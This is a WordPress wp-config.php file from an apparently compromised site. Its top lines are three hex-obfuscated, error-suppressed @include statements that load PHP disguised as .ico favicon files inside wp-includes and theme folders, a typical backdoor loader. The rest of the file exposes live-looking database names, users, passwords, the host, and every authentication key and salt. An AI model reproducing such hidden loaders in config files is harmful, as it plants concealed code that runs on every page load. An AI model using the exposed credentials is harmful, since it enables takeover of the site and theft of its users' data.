<?php
/*f6cef*/

@include "\x45:\x2fV\x68o\x73t\x73/\x73s\x65n\x74r\x65g\x61s\x2ec\x6fm\x2eb\x72/\x68t\x74p\x64o\x63s\x2fw\x70-\x4fL\x44-\x46/\x77p\x2di\x6ec\x6cu\x64e\x73/\x6as\x2f.\x34f\x652\x353\x61b\x2ei\x63o";

/*f6cef*/


/*88eb3*/

@include "\x45:\Vh\x6fsts\x73sent\x72egas\x2ecom.\x62r\ht\x74pdoc\x73/wp-\x4fLD-F\x2fwp-c\x6fnten\x74/the\x6des/f\x61vico\x6e_b35\x3025.i\x63o";

/*88eb3*/

/*5f1b3*/

@include "\x45:\Vh\x6fsts\x73sent\x72egas\x2ecom.\x62r\ht\x74pdoc\x73/wp-\x69nclu\x64es/R\x65ques\x74s/Ex\x63epti\x6fn/fa\x76icon\x5f3207\x39f.ic\x6f";

/*5f1b3*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'frankfkl1_wp');

/** MySQL database username */
define('DB_USER', 'frank_wp');

/** MySQL database password */
define('DB_PASSWORD', 'Joca7749@');

/** MySQL hostname */
define('DB_HOST', 'robb0283.publiccloud.com.br:3306');


//define('DB_NAME', 'frankfkl1_wordpress_3');

/** MySQL database username */
//define('DB_USER', 'frank_wordpres_5');

/** MySQL database password */
//define('DB_PASSWORD', 'l$s4NXH2g5');

/** MySQL hostname */
//define('DB_HOST', 'robb0283.publiccloud.com.br:3306');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '9P9vyZheSPa7fqWCOOo%1DFewh^%NZ%qV3e2T2mtCXyHMxjyUdGk5SsW4Em%fbN4');
define('SECURE_AUTH_KEY',  '&%pDT^axk(lf5j6Y7JH1Vryxt4cN&6YEu#6qD)YTUxS0lk7)XTs!G&T6ykBKZ2)o');
define('LOGGED_IN_KEY',    'XadI@zHHYdVpb*ty!x5JWTfJXwxa(mY*ttC4lny9BQeTfDWFYaaWbQd*nB512cYR');
define('NONCE_KEY',        'et1^QOB2l51h6g86oOfuEIPEbEtM5*tjlsLzY)qKbzsi9laAfbXmzg@dc0SzXqZx');
define('AUTH_SALT',        '!)dXY9@n@zZCB**zRggl0sBC8u(1v5s)YgtDMqYplRxS2SrmSCC1#G71)oBwJq2X');
define('SECURE_AUTH_SALT', '#SuWDfQfz)#1RC^&JJIBPFcY)ywMGCGhRW4IBRbXC8ga1ifBA5pc0lCGgA2s99cc');
define('LOGGED_IN_SALT',   '7EdwTErRPzm0efaEAAfEx(v4FZL(Z&v&6ob@IP1D2C25!^dADIXdwoXoenx7AN6k');
define('NONCE_SALT',       'uzLk^8h^qL!59uToymZ0X8KmZ&I&6mS&etkeVkn5133m9WB%FGDcetkDiqbMhXkL');
/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');

define( 'WP_ALLOW_MULTISITE', true );

define ('FS_METHOD', 'direct');
